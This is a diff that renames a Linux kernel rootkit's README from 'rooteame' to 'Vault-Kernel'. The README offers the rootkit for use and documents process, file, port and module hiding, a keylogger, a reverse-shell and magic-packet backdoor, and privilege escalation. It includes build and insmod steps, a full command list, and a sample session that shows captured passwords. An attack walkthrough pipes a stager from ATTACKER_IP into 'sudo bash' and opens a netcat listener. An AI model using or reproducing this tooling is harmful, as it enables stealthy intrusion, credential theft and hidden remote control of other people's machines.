@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=rect&color=CC0000&height=100&section=header&text=rooteame&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
+  <img src="https://capsule-render.vercel.app/api?type=rect&color=CC0000&height=100&section=header&text=Vault-Kernel&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
 </p>
 
 <p align="center">
@@ -21,9 +21,9 @@
 
 ---
 
-## 🎯 What is rooteame?
+## 🎯 What is Vault-Kernel?
 
-**rooteame** is a Linux kernel rootkit designed for **red team operations** and **security research**. It provides kernel-level process/file/port hiding, a keylogger, reverse shell backdoor, privilege escalation, and self-hiding capabilities — all controlled via a zero-dependency Go CLI.
+**Vault-Kernel** is a Linux kernel rootkit designed for **red team operations** and **security research**. It provides kernel-level process/file/port hiding, a keylogger, reverse shell backdoor, privilege escalation, and self-hiding capabilities — all controlled via a zero-dependency Go CLI.
 
 ```
 ┌─────────────────────────────────────────────────────────┐
@@ -39,14 +39,14 @@
 │  └────────────────────────┬────────────────────────────┘ │
 │                           │                              │
 │  ┌────────────────────────┴────────────────────────────┐ │
-│  │              /dev/rooteame (ioctl)                   │ │
+│  │              /dev/Vault-Kernel (ioctl)                   │ │
 │  └────────────────────────┬────────────────────────────┘ │
 └───────────────────────────┼──────────────────────────────┘
                             │
 ┌───────────────────────────┼──────────────────────────────┐
 │                    Userland Space                         │
 │  ┌───────────────────────┴──────────────────────────────┐│
-│  │              rooteame CLI (Go, 0 deps)                ││
+│  │              Vault-Kernel CLI (Go, 0 deps)                ││
 │  │  give-root │ hide-file │ hide-pid │ shell │ keylog   ││
 │  └──────────────────────────────────────────────────────┘│
 └──────────────────────────────────────────────────────────┘
@@ -86,41 +86,41 @@ sudo apt install build-essential linux-headers-$(uname -r) golang-go
 cd src && make
 
 # 2. Load into kernel
-sudo insmod rooteame.ko
+sudo insmod Vault-Kernel.ko
 
 # 3. Build Go client
-cd ../client/go && go build -o rooteame ./cmd/rooteame/
+cd ../client/go && go build -o Vault-Kernel ./cmd/Vault-Kernel/
 
 # 4. Verify it's loaded
-sudo ./rooteame status
+sudo ./Vault-Kernel status
 ```
 
 ### Usage
 
 ```bash
 # Escalate to root instantly
-sudo ./rooteame give-root
+sudo ./Vault-Kernel give-root
 
 # Hide a file from ls/find/stat
-sudo ./rooteame hide-file mal.sh
+sudo ./Vault-Kernel hide-file mal.sh
 
 # Hide a process from ps/top
-sudo ./rooteame hide-pid 1337
+sudo ./Vault-Kernel hide-pid 1337
 
 # Hide a network port from netstat/ss
-sudo ./rooteame hide-port 4444
+sudo ./Vault-Kernel hide-port 4444
 
 # Hide the rootkit from lsmod
-sudo ./rooteame hide-module
+sudo ./Vault-Kernel hide-module
 
 # Spawn reverse shell
-sudo ./rooteame shell 10.0.0.5:1337
+sudo ./Vault-Kernel shell 10.0.0.5:1337
 
 # Read captured keystrokes
-sudo ./rooteame keylog
+sudo ./Vault-Kernel keylog
 
 # List all hidden objects
-sudo ./rooteame list
+sudo ./Vault-Kernel list
 ```
 
 ---
@@ -131,7 +131,7 @@ sudo ./rooteame list
 
 ```bash
 # Terminal 1 — Attacker
-cd rooteame/payloads
+cd Vault-Kernel/payloads
 python3 payload.py                  # Generate bash_stager.sh
 python3 -m http.server 8080 &       # Serve payload
 nc -lvnp 4444                       # Listener for reverse shell
@@ -145,31 +145,31 @@ curl -s http://ATTACKER_IP:8080/bash_stager.sh | sudo bash
 ### CLI Session
 
 ```
-$ sudo ./rooteame status
-[+] rooteame module is loaded
+$ sudo ./Vault-Kernel status
+[+] Vault-Kernel module is loaded
 
-$ sudo ./rooteame give-root
+$ sudo ./Vault-Kernel give-root
 [+] Root privileges granted to PID 1337
 
-$ sudo ./rooteame hide-file /tmp/.hidden_malware
+$ sudo ./Vault-Kernel hide-file /tmp/.hidden_malware
 [+] File hidden: /tmp/.hidden_malware
 
-$ sudo ./rooteame hide-pid 666
+$ sudo ./Vault-Kernel hide-pid 666
 [+] Process hidden: PID 666
 
-$ sudo ./rooteame hide-port 4444
+$ sudo ./Vault-Kernel hide-port 4444
 [+] Port hidden: 4444/tcp
 
-$ sudo ./rooteame list
+$ sudo ./Vault-Kernel list
 Hidden files : 1
 Hidden PIDs  : 1
 Hidden ports : 1
 Module hidden: yes
 
-$ sudo ./rooteame keylog
+$ sudo ./Vault-Kernel keylog
 Captured: password123[Enter]sudo su[Enter]...
 
-$ sudo ./rooteame shell 10.0.0.5:1337
+$ sudo ./Vault-Kernel shell 10.0.0.5:1337
 [+] Reverse shell initiated to 10.0.0.5:1337
 ```
 
@@ -190,7 +190,7 @@ src/
 ├── backdoor.c      reverse shell + magic packet trigger
 ├── priv_esc.c      give_root via cred manipulation
 ├── stealth.c       hide from lsmod + kobject_del
-├── ioctl.c         /dev/rooteame char device
+├── ioctl.c         /dev/Vault-Kernel char device
 ├── core.h          headers + ioctl constants
 └── Makefile
 ```
@@ -199,7 +199,7 @@ src/
 
 ```
 client/go/
-├── cmd/rooteame/main.go    14 commands, zero dependencies
+├── cmd/Vault-Kernel/main.go    14 commands, zero dependencies
 └── internal/ioctl/         ioctl wrapper + 15 unit tests
 ```
 
@@ -226,21 +226,21 @@ Each payload includes: XOR obfuscation (bash), camouflaged logging (syslog), sel
 ## 📋 All CLI Commands
 
 ```bash
-rooteame status              # Check if module is loaded
-rooteame give-root [pid]     # Grant root to a process
-rooteame hide-file <name>    # Hide file/directory
-rooteame unhide-file <name>  # Unhide file/directory
-rooteame hide-pid <pid>      # Hide process
-rooteame unhide-pid <pid>    # Unhide process
-rooteame hide-port <port>    # Hide network port
-rooteame unhide-port <port>  # Unhide network port
-rooteame list                # List all hidden objects
-rooteame shell <ip:port>     # Initiate reverse shell
-rooteame magic <word>        # Activate backdoor without open port
-rooteame keylog              # Read captured keystrokes
-rooteame keylog-clear        # Clear keylogger buffer
-rooteame hide-module         # Hide rootkit from lsmod
-rooteame unhide-module       # Make module visible again
+Vault-Kernel status              # Check if module is loaded
+Vault-Kernel give-root [pid]     # Grant root to a process
+Vault-Kernel hide-file <name>    # Hide file/directory
+Vault-Kernel unhide-file <name>  # Unhide file/directory
+Vault-Kernel hide-pid <pid>      # Hide process
+Vault-Kernel unhide-pid <pid>    # Unhide process
+Vault-Kernel hide-port <port>    # Hide network port
+Vault-Kernel unhide-port <port>  # Unhide network port
+Vault-Kernel list                # List all hidden objects
+Vault-Kernel shell <ip:port>     # Initiate reverse shell
+Vault-Kernel magic <word>        # Activate backdoor without open port
+Vault-Kernel keylog              # Read captured keystrokes
+Vault-Kernel keylog-clear        # Clear keylogger buffer
+Vault-Kernel hide-module         # Hide rootkit from lsmod
+Vault-Kernel unhide-module       # Make module visible again
 ```
 
 ---
